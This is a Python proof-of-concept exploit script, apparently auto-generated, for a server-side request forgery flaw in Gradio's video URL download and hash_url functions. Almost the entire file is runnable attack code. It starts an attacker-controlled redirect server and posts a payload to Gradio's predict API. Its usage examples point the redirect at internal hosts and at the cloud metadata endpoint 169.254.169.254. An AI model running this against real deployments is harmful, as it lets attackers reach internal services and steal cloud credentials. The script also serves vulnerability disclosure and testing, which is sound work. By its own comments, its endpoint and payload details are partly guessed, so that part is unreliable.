#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: ssrf-001
# Sink: hash_url
# Auto-generated — run with: python3 ssrf_url_download_temp_copy_hash_url.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via gradio_src _format_video -> download_temp_copy_if_needed

This script demonstrates that an attacker can force the Gradio server to make HTTP
requests to internal/private IP addresses by providing a video URL that redirects
to an internal service. The vulnerability exists because:
1. _format_video accepts user-controlled video URLs
2. download_temp_copy_if_needed calls requests.get(url, stream=True) without
   validating the resolved IP or disabling redirects
3. hash_url also uses urllib.request.urlopen which follows redirects

The PoC sets up a simple HTTP server that redirects to an internal target,
simulating an attacker-controlled redirect server.
"""

import argparse
import http.server
import json
import os
import socket
import sys
import threading
import time
import urllib.parse
from http import HTTPStatus

# Safe default - uses a benign internal endpoint
DEFAULT_REDIRECT_TARGET = "http://127.0.0.1:22/"  # SSH port - harmless probe
DEFAULT_LISTEN_PORT = 9999
DEFAULT_GRADIO_URL = "http://localhost:7860"  # Default Gradio address


class RedirectHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that redirects all requests to the configured target."""
    
    def do_GET(self):
        # Redirect to the internal target (simulating attacker-controlled redirect)
        self.send_response(HTTPStatus.FOUND)
        self.send_header("Location", self.server.redirect_target)
        self.end_headers()
    
    def do_HEAD(self):
        self.do_GET()
    
    def log_message(self, format, *args):
        # Suppress default logging for cleaner output
        pass


class ThreadedHTTPServer(http.server.HTTPServer):
    """HTTP server that runs in a separate thread."""
    
    def __init__(self, server_address, handler_class, redirect_target):
        self.redirect_target = redirect_target
        super().__init__(server_address, handler_class)
    
    def serve_forever(self):
        """Override to add error handling."""
        try:
            super().serve_forever()
        except KeyboardInterrupt:
            pass


def start_redirect_server(redirect_target, port):
    """
    Start a simple HTTP server that redirects all requests to the specified target.
    
    Args:
        redirect_target: URL to redirect to (e.g., internal service)
        port: Port to listen on
    
    Returns:
        Tuple of (server_thread, server) for cleanup
    """
    server = ThreadedHTTPServer(
        ("0.0.0.0", port),
        RedirectHandler,
        redirect_target
    )
    
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"[*] Redirect server listening on 0.0.0.0:{port}")
    print(f"[*] Redirecting to: {redirect_target}")
    
    return server_thread, server


def send_ssrf_payload(gradio_url, attacker_url):
    """
    Send a video URL to Gradio that will trigger an SSRF request.
    
    The payload is sent as a video URL to the Gradio API endpoint that processes
    video inputs. The attacker URL points to our redirect server, which will
    redirect to an internal target.
    
    Args:
        gradio_url: Base URL of the Gradio instance
        attacker_url: URL of our redirect server (e.g., http://attacker.com:9999)
    """
    # Construct the API endpoint - this is the standard Gradio predict endpoint
    # The exact endpoint may vary, but this is the most common pattern
    api_url = urllib.parse.urljoin(gradio_url, "/api/predict/")
    
    # The payload structure depends on the Gradio component configuration
    # For a video component, the input is typically a JSON with the video URL
    payload = {
        "data": [attacker_url],
        "event_data": None,
        "fn_index": 0  # This may need adjustment based on the actual component index
    }
    
    print(f"[*] Sending SSRF payload to {api_url}")
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")
    
    try:
        import requests
        
        # Send the request with a timeout to avoid hanging
        response = requests.post(
            api_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}...")
        
        # Check if the request was processed (even if it failed internally)
        if response.status_code == 200:
            print("[+] SSRF payload sent successfully!")
            print("[*] Check the Gradio server logs for outbound connections")
        else:
            print(f"[!] Unexpected response: {response.status_code}")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        print("[*] Make sure the Gradio server is running and accessible")
    except requests.exceptions.Timeout:
        print("[!] Request timed out - the server may be processing the redirect")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for gradio_src _format_video vulnerability",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with default settings (probes localhost:22)
  python3 poc.py
  
  # Test against a specific internal service
  python3 poc.py --target http://169.254.169.254/latest/meta-data/
  
  # Test against a custom Gradio instance
  python3 poc.py --gradio-url http://my-gradio:7860 --target http://10.0.0.1:8080
        """
    )
    
    parser.add_argument(
        "--target",
        default=DEFAULT_REDIRECT_TARGET,
        help=f"Internal URL to redirect to (default: {DEFAULT_REDIRECT_TARGET})"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_LISTEN_PORT,
        help=f"Port for the redirect server (default: {DEFAULT_LISTEN_PORT})"
    )
    parser.add_argument(
        "--gradio-url",
        default=DEFAULT_GRADIO_URL,
        help=f"Gradio instance URL (default: {DEFAULT_GRADIO_URL})"
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Don't start the redirect server (use an existing attacker-controlled URL)"
    )
    parser.add_argument(
        "--attacker-url",
        help="Full attacker URL (overrides auto-generated URL from --port)"
    )
    
    args = parser.parse_args()
    
    # Validate the target URL
    parsed_target = urllib.parse.urlparse(args.target)
    if not parsed_target.scheme or not parsed_target.netloc:
        print(f"[!] Invalid target URL: {args.target}")
        sys.exit(1)
    
    # Determine the attacker URL
    if args.attacker_url:
        attacker_url = args.attacker_url
    else:
        # Get our public IP (or use localhost for testing)
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "127.0.0.1"
        
        attacker_url = f"http://{local_ip}:{args.port}/"
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for gradio_src")
    print("=" * 60)
    print(f"[*] Gradio URL: {args.gradio_url}")
    print(f"[*] Internal target: {args.target}")
    print(f"[*] Attacker URL: {attacker_url}")
    print()
    
    # Start the redirect server if needed
    server_thread = None
    server = None
    
    if not args.no_server:
        print("[*] Starting redirect server...")
        server_thread, server = start_redirect_server(args.target, args.port)
        time.sleep(0.5)  # Give the server time to start
    
    try:
        # Send the SSRF payload
        send_ssrf_payload(args.gradio_url, attacker_url)
        
        print()
        print("[*] If the Gradio server made a request to the internal target,")
        print("[*] the vulnerability is confirmed.")
        print()
        print("[*] Check the Gradio server logs for outbound connections to:")
        print(f"[*]   {args.target}")
        
    finally:
        # Cleanup
        if server:
            print("[*] Shutting down redirect server...")
            server.shutdown()


if __name__ == "__main__":
    main()
